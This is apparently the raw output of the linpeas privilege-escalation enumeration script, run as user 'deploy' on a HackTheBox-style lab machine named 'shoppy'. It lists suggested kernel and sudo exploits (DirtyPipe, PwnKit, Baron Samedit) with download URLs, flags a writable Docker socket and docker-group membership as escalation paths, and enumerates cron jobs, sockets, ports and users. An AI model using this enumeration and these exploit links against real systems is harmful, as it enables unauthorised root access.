LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/sh
PWD=/tmp
SSH_CONNECTION=10.10.14.133 34210 10.10.11.180 22
NVM_CD_FLAGS=
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                            
dmesg Not Found                                                                  
                                                                                 
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                               
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops                   

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                          
                                                                                 
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                
═╣ Execshield enabled? ............ Execshield Not Found                         
═╣ SELinux enabled? ............... sestatus Not Found                           
═╣ Is ASLR enabled? ............... Yes                                          
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                 

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════                                                           
                                             ╚═══════════╝                       
╔══════════╣ Container related tools present
/usr/bin/docker                                                                  
/usr/bin/runc
╔══════════╣ Container details
═╣ Is this a container? ........... No                                           
═╣ Any running containers? ........ No                                           
                                                                                 

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════                                                            
                          ╚════════════════════════════════════════════════╝     
╔══════════╣ Cleaned processes
[i] Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes                                                  
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                       
                 thread-self  cat/proc/thread-self//cmdline                      
                 self      cat/proc/self//cmdline
                 24873     /bin/sh./linpeas.sh.1
                 24871     sed-Es,gdm-password|gnome-keyring-daemon[0m|lightdm|vsftpd|apache2|sshd:,&,
                 24870     seds,knockd\|splunk,&,
                 24869     sed-Es,jdwp|tmux |screen |--inspect|--remote-debugging-port,&,g                                                                        
                 24868     seds,root,&,
                 24867     seds,deploy,&,
                 24866     sed-Es,_amavisd|_analyticsd|_appinstalld|_appleevents|_applepay|_appowner|_appserver|_appstore|_ard|_assetcache|_astris|_atsserver|_avbdeviced|_calendar|_captiveagent|_ces|_clamav|_cmiodalassistants|_coreaudiod|_coremediaiod|_coreml|_ctkd|_cvmsroot|_cvs|_cyrus|_datadetectors|_demod|_devdocs|_devicemgr|_diskimagesiod|_displaypolicyd|_distnote|_dovecot|_dovenull|_dpaudio|_driverkit|_eppc|_findmydevice|_fpsd|_ftp|_fud|_gamecontrollerd|_geod|_hidd|_iconservices|_installassistant|_installcoordinationd|_installer|_jabber|_kadmin_admin|_kadmin_changepw|_knowledgegraphd|_krb_anonymous|_krb_changepw|_krb_kadmin|_krb_kerberos|_krb_krbtgt|_krbfast|_krbtgt|_launchservicesd|_lda|_locationd|_logd|_lp|_mailman|_mbsetupuser|_mcxalr|_mdnsresponder|_mobileasset|_mysql|_nearbyd|_netbios|_netstatistics|_networkd|_nsurlsessiond|_nsurlstoraged|_oahd|_ondemand|_postfix|_postgres|_qtss|_reportmemoryexception|_rmd|_sandbox|_screensaver|_scsd|_securityagent|_softwareupdate|_spotlight|_sshd|_svn|_taskgated|_teamsserver|_timed|_timezone|_tokend|_trustd|_trustevaluationagent|_unknown|_update_sharing|_usbmuxd|_uucp|_warmd|_webauthserver|_windowserver|_www|_wwwproxy|_xserverdocs|daemon\W|^daemon$|message\+|syslog|www|www-data|mail|noboby|Debian\-\+|rtkit|systemd\+,&,
                 24865     sed-Es,/init$|upstart-udev-bridge|udev|/getty|cron|apache2|java|tomcat|/vmtoolsd|/VGAuthService,&,                                     
                 24864     sed-Es,_apt|backup|bin[\s:]|^bin$|colord|daemon|Debian-gdm|dnsmasq|games|geoclue|gnats|irc|list|lp|mail|man|messagebus|mongodb|news|nginx|nobody|proxy|pulse|rtkit|saned|speech-dispatcher|sshd|sync|systemd-coredump|systemd-network|systemd-resolve|systemd-timesync|sys|tss|usbmux|uucp|www-data|ImPoSSssSiBlEee,&,                                                                    
                 24863     sort-r
                 24862     sed-Es,jaeger|deploy|postgres|mattermost|ImPoSSssSiBlEee,&,                                                                            
                 24861     /bin/sh./linpeas.sh.1
                 24860     sed-Es,/dev/mqueue|/dev/shm|/home/deploy|/home/deploy/.gnupg|/home/deploy/.gnupg/private-keys-v1.d|/run/lock|/tmp|/tmp/10.10.14.133:8000|/tmp/.font-unix|/tmp/.ICE-unix|/tmp/.Test-unix|/tmp/VMwareDnD|/tmp/.X11-unix|/tmp/.XIM-unix|/var/tmp|[a-zA-Z]+[a-zA-Z0-9]* +\*,&,g                              
                 24859     /bin/sh./linpeas.sh.1
                 21576     /bin/sh./linpeas.sh.1
                 15852     bash
                 15777     sh

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                
COMMAND     PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME                  

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                
gdm-password Not Found                                                           
gnome-keyring-daemon Not Found                                                   
lightdm Not Found                                                                
vsftpd Not Found                                                                 
apache2 Not Found                                                                
sshd Not Found                                                                   
                                                                                 
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                            
/usr/bin/crontab                                                                 
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 22  2021 /etc/crontab                         

/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 Jul 22 13:54 .
drwxr-xr-x 126 root root 12288 Nov  8 04:13 ..
-rw-r--r--   1 root root   285 Feb  6  2021 anacron
-rw-r--r--   1 root root   201 Jun  7  2021 e2scrub_all
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat

/etc/cron.daily:
total 48
drwxr-xr-x   2 root root  4096 Sep 12 13:27 .
drwxr-xr-x 126 root root 12288 Nov  8 04:13 ..
-rwxr-xr-x   1 root root   311 Feb  6  2021 0anacron
-rwxr-xr-x   1 root root  1478 Jun 10  2021 apt-compat
-rwxr-xr-x   1 root root   384 Nov 19  2019 cracklib-runtime
-rwxr-xr-x   1 root root  1298 Jul  1 21:33 dpkg
-rwxr-xr-x   1 root root   377 Jan 30  2022 logrotate
-rwxr-xr-x   1 root root  1123 Feb 19  2021 man-db
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder
-rwxr-xr-x   1 root root   518 Feb  2  2021 sysstat

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Jul 22 11:24 .
drwxr-xr-x 126 root root 12288 Nov  8 04:13 ..
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Jul 22 11:36 .
drwxr-xr-x 126 root root 12288 Nov  8 04:13 ..
-rwxr-xr-x   1 root root   313 Feb  6  2021 0anacron
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root  4096 Jul 22 11:37 .
drwxr-xr-x 126 root root 12288 Nov  8 04:13 ..
-rwxr-xr-x   1 root root   312 Feb  6  2021 0anacron
-rwxr-xr-x   1 root root   813 Feb 19  2021 man-db
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Jul 22 11:39 .
drwxr-xr-x 5 root root 4096 Jul 22 14:00 ..
-rw------- 1 root root    9 Nov  8 04:18 cron.daily
-rw------- 1 root root    9 Nov  8 04:28 cron.monthly
-rw------- 1 root root    9 Nov  8 04:23 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                    
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services      
You can't write on systemd PATH                                                  

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers        
NEXT                        LEFT          LAST                        PASSED              UNIT                         ACTIVATES
Tue 2022-11-08 13:30:23 CST 27min left    Tue 2022-11-08 12:31:30 CST 31min ago           anacron.timer                anacron.service
Tue 2022-11-08 15:31:43 CST 2h 28min left Mon 2022-08-08 10:27:52 CDT 3 months 0 days ago apt-daily.timer              apt-daily.service
Tue 2022-11-08 15:33:18 CST 2h 30min left Mon 2022-08-08 06:19:57 CDT 3 months 1 days ago fwupd-refresh.timer          fwupd-refresh.service
Wed 2022-11-09 00:00:00 CST 10h left      Tue 2022-11-08 04:13:38 CST 8h ago              logrotate.timer              logrotate.service
Wed 2022-11-09 00:00:00 CST 10h left      Tue 2022-11-08 04:13:38 CST 8h ago              man-db.timer                 man-db.service
Wed 2022-11-09 04:28:32 CST 15h left      Tue 2022-11-08 04:28:32 CST 8h ago              systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Wed 2022-11-09 06:38:22 CST 17h left      Tue 2022-11-08 06:56:41 CST 6h ago              apt-daily-upgrade.timer      apt-daily-upgrade.service
Sun 2022-11-13 03:10:59 CST 4 days left   Tue 2022-11-08 04:13:59 CST 8h ago              e2scrub_all.timer            e2scrub_all.service
Mon 2022-11-14 01:02:47 CST 5 days left   Tue 2022-11-08 04:33:52 CST 8h ago              fstrim.timer                 fstrim.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers        
                                                                                 
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets       
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket                                                                
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket                                           
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                              
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                           
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                    
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                    
Docker socket /var/run/docker.sock is writable (https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-docker-socket)
Docker socket /run/docker.sock is writable (https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-docker-socket)

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets       
/home/deploy/.gnupg/S.gpg-agent                                                  
  └─(Read Write)
/home/deploy/.gnupg/S.gpg-agent.browser
  └─(Read Write)
/home/deploy/.gnupg/S.gpg-agent.extra
  └─(Read Write)
/home/deploy/.gnupg/S.gpg-agent.ssh
  └─(Read Write)
/home/jaeger/.pm2/pub.sock
  └─(Read )
/home/jaeger/.pm2/rpc.sock
  └─(Read )
/run/containerd/containerd.sock
/run/containerd/containerd.sock.ttrpc
/run/dbus/system_bus_socket
  └─(Read Write)
/run/docker.sock
  └─(Read Write)
/run/postgresql/.s.PGSQL.5432
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/vmware/guestServicePipe
  └─(Read Write)
/tmp/dbus-3CP0dpfOaB
/tmp/dbus-dEKc0ke9Es
/tmp/dbus-fpfVi0fM
/tmp/dbus-JAvsF6knSa
/tmp/dbus-ONrgP4dv
/tmp/dbus-OT4sWb0y
/tmp/dbus-pnO65Vny
/tmp/dbus-uftitgtG
/tmp/dbus-xWwRDHQB
/tmp/.ICE-unix/1045
  └─(Read Write)
/tmp/mongodb-27017.sock
/tmp/plugin123630812
  └─(Read )
/tmp/plugin227633031
  └─(Read )
/tmp/plugin249747073
  └─(Read )
/tmp/plugin2623760581
  └─(Read )
/tmp/plugin3438945239
  └─(Read )
/tmp/.X11-unix/X0
  └─(Read Write)
/var/lib/gdm3/.cache/ibus/dbus-19L5REXV
/var/run/docker/libnetwork/ab09b6fef16f.sock
/var/run/docker/metrics.sock
/var/run/postgresql/.s.PGSQL.5432
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus         
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">)
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/gdm.conf (  <policy user="Debian-gdm">)
Possible weak user policy found on /etc/dbus-1/system.d/net.hadess.SensorProxy.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus         
NAME                                  PID PROCESS USER             CONNECTION    UNIT SESSION DESCRIPTION
:1.0                                    1 n/a     root             :1.0          -    -       -
:1.1                                  477 n/a     systemd-timesync :1.1          -    -       -
:1.10                                 644 n/a     root             :1.10         -    -       -
:1.109                              27432 busctl  deploy           :1.109        -    -       -
:1.11                                 713 n/a     root             :1.11         -    -       -
:1.2                                  640 n/a     root             :1.2          -    -       -
:1.21                                 925 n/a     root             :1.21         -    -       -
:1.24                                 938 n/a     Debian-gdm       :1.24         -    -       -
:1.26                                 936 n/a     Debian-gdm       :1.26         -    -       -
:1.27                                1045 n/a     Debian-gdm       :1.27         -    -       -
:1.28                                1247 n/a     Debian-gdm       :1.28         -    -       -
:1.3                                  632 n/a     root             :1.3          -    -       -
:1.30                                1247 n/a     Debian-gdm       :1.30         -    -       -
:1.31                                1334 n/a     root             :1.31         -    -       -
:1.32                                1337 n/a     root             :1.32         -    -       -
:1.34                                1343 n/a     Debian-gdm       :1.34         -    -       -
:1.35                                1357 n/a     Debian-gdm       :1.35         -    -       -
:1.36                                1360 n/a     Debian-gdm       :1.36         -    -       -
:1.37                                1352 n/a     Debian-gdm       :1.37         -    -       -
:1.38                                1350 n/a     Debian-gdm       :1.38         -    -       -
:1.39                                1373 n/a     Debian-gdm       :1.39         -    -       -
:1.4                                  647 n/a     root             :1.4          -    -       -
:1.40                                1403 n/a     Debian-gdm       :1.40         -    -       -
:1.41                                1385 n/a     Debian-gdm       :1.41         -    -       -
:1.42                                1373 n/a     Debian-gdm       :1.42         -    -       -
:1.43                                1431 n/a     colord           :1.43         -    -       -
:1.5                                  645 n/a     root             :1.5          -    -       -
:1.6                                  643 n/a     root             :1.6          -    -       -
:1.7                                  678 n/a     root             :1.7          -    -       -
:1.8                                  636 n/a     root             :1.8          -    -       -
com.ubuntu.SoftwareProperties           - -       -                (activatable) -    -       -
fi.w1.wpa_supplicant1                 647 n/a     root             :1.4          -    -       -
net.hadess.SwitcherooControl          643 n/a     root             :1.6          -    -       -
 -- EUID=0 
org.bluez                               - -       -                (activatable) -    -       -
org.freedesktop.Accounts              632 n/a     root             :1.3          -    -       -
org.freedesktop.ColorManager         1431 n/a     colord           :1.43         -    -       -
org.freedesktop.DBus                    1 n/a     root             -             -    -       -
org.freedesktop.ModemManager1         678 n/a     root             :1.7          -    -       -
org.freedesktop.NetworkManager        636 n/a     root             :1.8          -    -       -
org.freedesktop.PackageKit           1337 n/a     root             :1.32         -    -       -
org.freedesktop.PolicyKit1            640 n/a     root             :1.2          -    -       -
org.freedesktop.RealtimeKit1            - -       -                (activatable) -    -       -
org.freedesktop.UDisks2               645 n/a     root             :1.5          -    -       -
org.freedesktop.UPower               1334 n/a     root             :1.31         -    -       -
org.freedesktop.bolt                    - -       -                (activatable) -    -       -
org.freedesktop.fwupd                   - -       -                (activatable) -    -       -
org.freedesktop.hostname1               - -       -                (activatable) -    -       -
org.freedesktop.locale1                 - -       -                (activatable) -    -       -
org.freedesktop.login1                644 n/a     root             :1.10         -    -       -
org.freedesktop.network1                - -       -                (activatable) -    -       -
org.freedesktop.nm_dispatcher           - -       -                (activatable) -    -       -
org.freedesktop.realmd                  - -       -                (activatable) -    -       -
org.freedesktop.resolve1                - -       -                (activatable) -    -       -
org.freedesktop.systemd1                1 n/a     root             :1.0          -    -       -
org.freedesktop.timedate1               - -       -                (activatable) -    -       -
org.freedesktop.timesync1             477 n/a     systemd-timesync :1.1          -    -       -
org.gnome.DisplayManager              713 n/a     root             :1.11         -    -       -
 -- EUID=0 
org.opensuse.CupsPkHelper.Mechanism     - -       -                (activatable) -    -       -


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                                           
                                        ╚═════════════════════╝                  
╔══════════╣ Hostname, hosts and DNS
shoppy                                                                           
127.0.0.1       localhost
127.0.1.1       shoppy.htb      shoppy

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 8.8.8.8
htb

╔══════════╣ Interfaces
default         0.0.0.0                                                          
loopback        127.0.0.0
link-local      169.254.0.0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:acff:fe58:801  prefixlen 64  scopeid 0x20<link>
        ether 02:42:ac:58:08:01  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16  bytes 1532 (1.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.180  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:6ed4  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:6ed4  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:6e:d4  txqueuelen 1000  (Ethernet)
        RX packets 5281378  bytes 790235807 (753.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6156484  bytes 2809976158 (2.6 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 25754112  bytes 4116548463 (3.8 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25754112  bytes 4116548463 (3.8 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8065          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:3000                :::*                    LISTEN      -                   
tcp6       0      0 ::1:5432                :::*                    LISTEN      -                   
tcp6       0      0 :::9093                 :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                               
                                                                                 


                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                                           
                                         ╚═══════════════════╝                   
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users         
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)                

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                     
netpgpkeys Not Found
netpgp Not Found                                                                 
                                                                                 
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid 
                                                                                 
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                            
ptrace protection is disabled (0)                                                
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                        
                                                                                 
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                  

╔══════════╣ Users with console
deploy:x:1001:1001::/home/deploy:/bin/sh                                         
jaeger:x:1000:1000:jaeger,,,:/home/jaeger:/bin/bash
mattermost:x:998:997::/home/mattermost:/bin/sh
postgres:x:119:127:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                           
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(tss) gid=109(tss) groups=109(tss)
uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=105(systemd-timesync) gid=111(systemd-timesync) groups=111(systemd-timesync)
uid=106(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=107(rtkit) gid=115(rtkit) groups=115(rtkit)
uid=108(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=111(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=112(pulse) gid=118(pulse) groups=118(pulse),29(audio)
uid=113(saned) gid=121(saned) groups=121(saned),120(scanner)
uid=114(colord) gid=122(colord) groups=122(colord)
uid=115(geoclue) gid=123(geoclue) groups=123(geoclue)
uid=116(Debian-gdm) gid=124(Debian-gdm) groups=124(Debian-gdm)
uid=117(nginx) gid=125(nginx) groups=125(nginx)
uid=118(mongodb) gid=65534(nogroup) groups=65534(nogroup),126(mongodb)
uid=119(postgres) gid=127(postgres) groups=127(postgres),114(ssl-cert)
